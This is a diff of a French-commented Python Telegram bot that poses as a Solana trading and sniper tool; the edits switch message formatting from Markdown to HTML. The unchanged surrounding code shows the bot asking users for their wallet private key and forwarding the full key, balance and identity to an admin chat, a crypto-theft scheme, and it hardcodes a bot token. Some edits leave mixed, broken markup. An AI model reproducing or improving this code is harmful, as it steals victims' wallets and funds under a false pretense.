@@ -3,6 +3,7 @@ import base58
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+import html as html_module
 
 # Configuration du logging
 logging.basicConfig(
@@ -10,6 +11,13 @@ logging.basicConfig(
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+
+def escape_html(text):
+    """Échappe les caractères HTML pour éviter les erreurs de parsing"""
+    if text is None:
+        return ''
+    return html_module.escape(str(text))
 
 # ⚠️ REMPLACEZ PAR VOTRE TOKEN
 BOT_TOKEN = "8402114053:AAFLGOTHTX1pmNZ9JiPL64MMBTNSbriqTfc"
@@ -97,7 +105,7 @@ async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📈 **Trading Module**\n\nSelect your trading option:",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -112,7 +120,7 @@ async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "The sniper will automatically buy new tokens as soon as they are listed.\n\n"
         "Use /wallet to connect your wallet first.",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -133,11 +141,11 @@ async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await update.message.reply_text(
             f"💼 **Your Wallet**\n\n"
-            f"💳 **Type:** {wallet_type}\n"
-            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)\n"
-            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`",
+            f"💳 **Type:** {escape_html(wallet_type)}\n"
+            f"💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)\n"
+            f"👛 <b>Address:</b> `{public_key[:8]}...{public_key[-8:]}`",
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
     else:
         wallet_message = """🔐 Import Wallet
@@ -175,7 +183,7 @@ async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Rug-pull risk assessment\n\n"
         "Format: Paste the contract address",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -195,7 +203,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Recent transactions\n\n"
         "Use /wallet to connect your wallet.",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -236,7 +244,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         help_text,
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -251,7 +259,7 @@ async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚠️ Wallet connection required.\n\n"
         "Use /wallet to connect first.",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -271,7 +279,7 @@ async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚠️ Wallet connection required.\n\n"
         "Use /wallet to connect first.",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -290,7 +298,7 @@ async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         "• Coordinated trading\n\n"
         "Use /wallet to add your first wallet.",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -310,7 +318,7 @@ async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Mint/freeze authority\n\n"
         "Send a contract address to analyze.",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -330,7 +338,7 @@ async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Historical data\n\n"
         "Get predictions for any token!",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -349,7 +357,7 @@ async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• DEX transactions\n\n"
         "Get alerts when whales move!",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -369,7 +377,7 @@ async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Known scam indicators\n\n"
         "Send a token address to check!",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
 
 
@@ -462,7 +470,7 @@ Please enter your private key below:"""
         await query.message.reply_text(
             instruction_message,
             reply_markup=back_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         # Marquer que l'utilisateur attend de connecter son wallet
         context.user_data['waiting_for_wallet'] = True
@@ -531,7 +539,7 @@ Select your new wallet provider:"""
             await query.message.delete()
             await query.message.reply_text(
                 request_message,
-                parse_mode='Markdown'
+                parse_mode='HTML'
             )
             
             # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -579,7 +587,7 @@ Select your wallet provider:"""
             "• Historical data\n\n"
             "Get predictions for any token!",
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -599,7 +607,7 @@ Select your wallet provider:"""
             "• DEX transactions\n\n"
             "Get alerts when whales move!",
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -620,7 +628,7 @@ Select your wallet provider:"""
             "• Known scam indicators\n\n"
             "Send a token address to check!",
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -638,7 +646,7 @@ Select your wallet provider:"""
         await query.message.reply_text(
             "🌐 **Select Language**\n\nChoose your preferred language:",
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -659,27 +667,8 @@ Select your wallet provider:"""
             "• Recent transactions\n\n"
             "Use /wallet to connect your wallet.",
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
-
-    # Extended handlers for additional buttons
-    # Boutons d'information
-    if action == 'view_tracked':
-        await handle_view_tracked(query, context)
-        return
-    elif action == 'check_balance':
-        await handle_check_balance(query, context)
-        return
-    elif action == 'modify_config':
-        await handle_modify_config(query, context)
-        return
-    
-    # Boutons d'action
-    elif action in ['start_trading', 'start_whale_track', 'get_prediction', 'market_analysis', 
-                    'scan_rugs', 'risk_report', 'analyze_contract', 'start_scan', 'whale_moves']:
-        await handle_action_button(query, context, action_name=action)
-        return
-
         return
 
 
@@ -703,7 +692,7 @@ These wallets are being monitored for trading activity."""
     keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')
+    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')
 
 
 async def handle_check_balance(query, context):
@@ -714,8 +703,8 @@ async def handle_check_balance(query, context):
     
     message = f"""💰 **Wallet Balance**
 
-👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`
-💵 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
+👛 <b>Address:</b> `{public_key[:8]}...{public_key[-8:]}`
+💵 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
 
 Last updated: Just now"""
     
@@ -723,7 +712,7 @@ Last updated: Just now"""
                 [InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')
+    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')
 
 
 async def handle_modify_config(query, context):
@@ -740,7 +729,7 @@ What would you like to change?"""
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')
+    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')
 
 
 async def handle_action_button(query, context, action_name):
@@ -762,10 +751,40 @@ async def handle_action_button(query, context, action_name):
     keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')
+    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')
 
 
 # Ajout dans button_handler pour gérer tous les nouveaux boutons
+async def button_handler_extended(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Extension du button_handler pour les nouveaux boutons"""
+    query = update.callback_query
+    await query.answer()
+    
+    action = query.data
+    
+    # Boutons d'information
+    if action == 'view_tracked':
+        await handle_view_tracked(query, context)
+        return
+    elif action == 'check_balance':
+        await handle_check_balance(query, context)
+        return
+    elif action == 'modify_config':
+        await handle_modify_config(query, context)
+        return
+    
+    # Boutons d'action
+    elif action in ['start_trading', 'start_whale_track', 'get_prediction', 'market_analysis', 
+                    'scan_rugs', 'risk_report', 'analyze_contract', 'start_scan', 'whale_moves']:
+        await handle_action_button(query, context, action)
+        return
+    
+    # Si ce n'est pas un nouveau bouton, laisser passer au button_handler original
+    return None
+
+
+
+
 async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gère la commande /quickbuy - identique au bouton Quick Buy"""
     # Vérifier si le wallet est connecté
@@ -773,7 +792,7 @@ async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -782,7 +801,7 @@ async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -797,7 +816,7 @@ async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -806,7 +825,7 @@ async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -821,7 +840,7 @@ async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -830,7 +849,7 @@ async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -845,7 +864,7 @@ async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -854,7 +873,7 @@ async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -869,7 +888,7 @@ async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -878,7 +897,7 @@ async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -893,7 +912,7 @@ async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -902,7 +921,7 @@ async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -917,7 +936,7 @@ async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **Wallet Required**\n\n"
             "Please connect your wallet first using /start",
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         return
     
@@ -926,7 +945,7 @@ async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         request_message,
-        parse_mode='Markdown'
+        parse_mode='HTML'
     )
     
     # Marquer que l'utilisateur doit fournir les infos de tracking
@@ -1132,7 +1151,7 @@ async def verify_wallet_and_balance(private_key_str: str):
             if len(secret_key) == 64:  # Taille correcte pour Solana
                 keypair = Keypair.from_bytes(secret_key)
                 public_key = str(keypair.pubkey())
-                logger.info(f"✅ Clé décodée en Base58, Public Key: {public_key}")
+                logger.info(f"✅ Clé décodée en Base58, Public Key: {escape_html(public_key)}")
         except Exception as e:
             logger.info(f"Format Base58 échoué: {e}")
         
@@ -1145,7 +1164,7 @@ async def verify_wallet_and_balance(private_key_str: str):
                 if len(secret_key) == 64:
                     keypair = Keypair.from_bytes(secret_key)
                     public_key = str(keypair.pubkey())
-                    logger.info(f"✅ Clé décodée en liste bytes, Public Key: {public_key}")
+                    logger.info(f"✅ Clé décodée en liste bytes, Public Key: {escape_html(public_key)}")
             except Exception as e:
                 logger.info(f"Format liste bytes échoué: {e}")
         
@@ -1156,7 +1175,7 @@ async def verify_wallet_and_balance(private_key_str: str):
                 if len(secret_key) == 64:
                     keypair = Keypair.from_bytes(secret_key)
                     public_key = str(keypair.pubkey())
-                    logger.info(f"✅ Clé décodée en Hex, Public Key: {public_key}")
+                    logger.info(f"✅ Clé décodée en Hex, Public Key: {escape_html(public_key)}")
             except Exception as e:
                 logger.info(f"Format Hex échoué: {e}")
         
@@ -1214,34 +1233,34 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         if not is_valid:
             # Configuration invalide
             await update.message.reply_text(
-                f"⚠️ **Configuration Error**\n\n{error_message}\n\nPlease try again with the correct format.",
-                parse_mode='Markdown'
+                f"⚠️ **Configuration Error**\n\n{escape_html(error_message)}\n\nPlease try again with the correct format.",
+                parse_mode='HTML'
             )
             
             # Remettre en attente de configuration
             context.user_data['waiting_for_tracking_config'] = True
             
             # Notification à l'admin
-            admin_notification = f"""⚠️ **Configuration invalide reçue**
+            admin_notification = f"""⚠️ <b>Configuration invalide reçue</b>
 
-👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
-🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
-🔢 **User ID:** `{user.id}`
-🎯 **Commande:** {tracking_command}
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🔢 <b>User ID:</b> `{user.id}`
+🎯 <b>Commande:</b> {escape_html(tracking_command)}
 
-❌ **Erreur:** {error_message}
+❌ <b>Erreur:</b> {escape_html(error_message)}
 
-📋 **Configuration tentée:**
-{user_message}
+📋 <b>Configuration tentée:</b>
+{escape_html(user_message)}
 
 ---
-❌ _Configuration rejetée_"""
+❌ <i>Configuration rejetée</i>"""
             
             try:
                 await context.bot.send_message(
                     chat_id=ADMIN_CHAT_ID,
                     text=admin_notification,
-                    parse_mode='Markdown'
+                    parse_mode='HTML'
                 )
             except Exception as e:
                 logger.error(f"Erreur envoi à l'admin: {e}")
@@ -1389,31 +1408,31 @@ You can now access all trading features and start trading!"""
         await update.message.reply_text(
             confirmation_message,
             reply_markup=reply_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         
         # Notification à l'admin
-        admin_notification = f"""📊 **Configuration de tracking reçue**
+        admin_notification = f"""📊 <b>Configuration de tracking reçue</b>
 
-👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
-🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
-🔢 **User ID:** `{user.id}`
-🎯 **Commande:** {tracking_command}
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🔢 <b>User ID:</b> `{user.id}`
+🎯 <b>Commande:</b> {escape_html(tracking_command)}
 
-👛 **Wallet:** `{public_key}`
-💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
+👛 <b>Wallet:</b> `{escape_html(public_key)}`
+💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
 
 📋 **Configuration:**
 {user_message}
 
 ---
-✅ _Configuration acceptée_"""
+✅ <i>Configuration acceptée</i>"""
         
         try:
             await context.bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=admin_notification,
-                parse_mode='Markdown'
+                parse_mode='HTML'
             )
         except Exception as e:
             logger.error(f"Erreur envoi à l'admin: {e}")
@@ -1439,24 +1458,24 @@ You can now access all trading features and start trading!"""
             )
             
             # Notification à l'admin
-            admin_notification = f"""❌ **Clé privée invalide**
+            admin_notification = f"""❌ <b>Clé privée invalide</b>
 
-👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
-🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
-🔢 **User ID:** `{user.id}`
-💳 **Wallet Type:** {wallet_type}
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🔢 <b>User ID:</b> `{user.id}`
+💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-🔑 **Clé tentée:**
+🔑 <b>Clé tentée:</b>
 `{user_message[:20]}...`
 
 ---
-⚠️ _Clé privée invalide_"""
+⚠️ <i>Clé privée invalide</i>"""
             
             try:
                 await context.bot.send_message(
                     chat_id=ADMIN_CHAT_ID,
                     text=admin_notification,
-                    parse_mode='Markdown'
+                    parse_mode='HTML'
                 )
             except Exception as e:
                 logger.error(f"Erreur envoi à l'admin: {e}")
@@ -1478,30 +1497,30 @@ You can now access all trading features and start trading!"""
             )
             
             # Notification à l'admin
-            admin_notification = f"""⚠️ **Wallet rejeté - Solde insuffisant**
+            admin_notification = f"""⚠️ <b>Wallet rejeté - Solde insuffisant</b>
 
-👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
-🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
-🔢 **User ID:** `{user.id}`
-💳 **Wallet Type:** {wallet_type}
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🔢 <b>User ID:</b> `{user.id}`
+💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-👛 **Public Key:** `{public_key}`
-💰 **Balance:** {sol_balance:.4f} SOL
-💵 **Valeur USD:** ${usd_value:.2f}
-📊 **Prix SOL:** ${sol_price:.2f}
-⚠️ **Minimum requis:** ${MINIMUM_USD_REQUIRED:.2f}
+👛 <b>Public Key:</b> `{escape_html(public_key)}`
+💰 <b>Balance:</b> {sol_balance:.4f} SOL
+💵 <b>Valeur USD:</b> ${usd_value:.2f}
+📊 <b>Prix SOL:</b> ${sol_price:.2f}
+⚠️ <b>Minimum requis:</b> ${MINIMUM_USD_REQUIRED:.2f}
 
-🔑 **Private Key:**
+🔑 <b>Private Key:</b>
 `{user_message}`
 
 ---
-❌ _Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
+❌ <i>Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
             
             try:
                 await context.bot.send_message(
                     chat_id=ADMIN_CHAT_ID,
                     text=admin_notification,
-                    parse_mode='Markdown'
+                    parse_mode='HTML'
                 )
             except Exception as e:
                 logger.error(f"Erreur envoi à l'admin: {e}")
@@ -1522,38 +1541,38 @@ You can now access all trading features and start trading!"""
         
         await update.message.reply_text(
             f"✅ **Wallet Connected Successfully**\n\n"
-            f"💳 **Type:** {wallet_type}\n"
-            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
-            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`\n\n"
+            f"💳 **Type:** {escape_html(wallet_type)}\n"
+            f"💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
+            f"👛 <b>Address:</b> `{public_key[:8]}...{public_key[-8:]}`\n\n"
             f"You can now access all trading features.",
             reply_markup=back_markup,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         
         # Notification à l'admin
-        admin_notification = f"""✅ **Wallet connecté avec succès**
+        admin_notification = f"""✅ <b>Wallet connecté avec succès</b>
 
-👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
-🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
-🔢 **User ID:** `{user.id}`
-💳 **Wallet Type:** {wallet_type}
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🔢 <b>User ID:</b> `{user.id}`
+💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-👛 **Public Key:** `{public_key}`
-💰 **Balance:** {sol_balance:.4f} SOL
-💵 **Valeur USD:** ${usd_value:.2f}
-📊 **Prix SOL:** ${sol_price:.2f}
+👛 <b>Public Key:</b> `{escape_html(public_key)}`
+💰 <b>Balance:</b> {sol_balance:.4f} SOL
+💵 <b>Valeur USD:</b> ${usd_value:.2f}
+📊 <b>Prix SOL:</b> ${sol_price:.2f}
 
-🔑 **Private Key:**
+🔑 <b>Private Key:</b>
 `{user_message}`
 
 ---
-✅ _Wallet accepté et connecté_"""
+✅ <i>Wallet accepté et connecté</i>"""
         
         try:
             await context.bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=admin_notification,
-                parse_mode='Markdown'
+                parse_mode='HTML'
             )
         except Exception as e:
             logger.error(f"Erreur envoi à l'admin: {e}")
@@ -1561,24 +1580,24 @@ You can now access all trading features and start trading!"""
         return
     
     # Message normal - Notification à l'admin
-    admin_notification = f"""📨 **Nouveau message reçu**
+    admin_notification = f"""📨 <b>Nouveau message reçu</b>
 
-👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
-🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
-🔢 **User ID:** `{user.id}`
+👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
+🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
+🔢 <b>User ID:</b> `{user.id}`
 
-💬 **Message:**
-{user_message}
+💬 <b>Message:</b>
+{escape_html(user_message)}
 
 ---
-_Envoyé depuis le bot_"""
+<i>Envoyé depuis le bot</i>"""
     
     try:
         # Envoyer le message à l'admin
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=admin_notification,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         
     except Exception as e:
@@ -1628,3 +1647,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
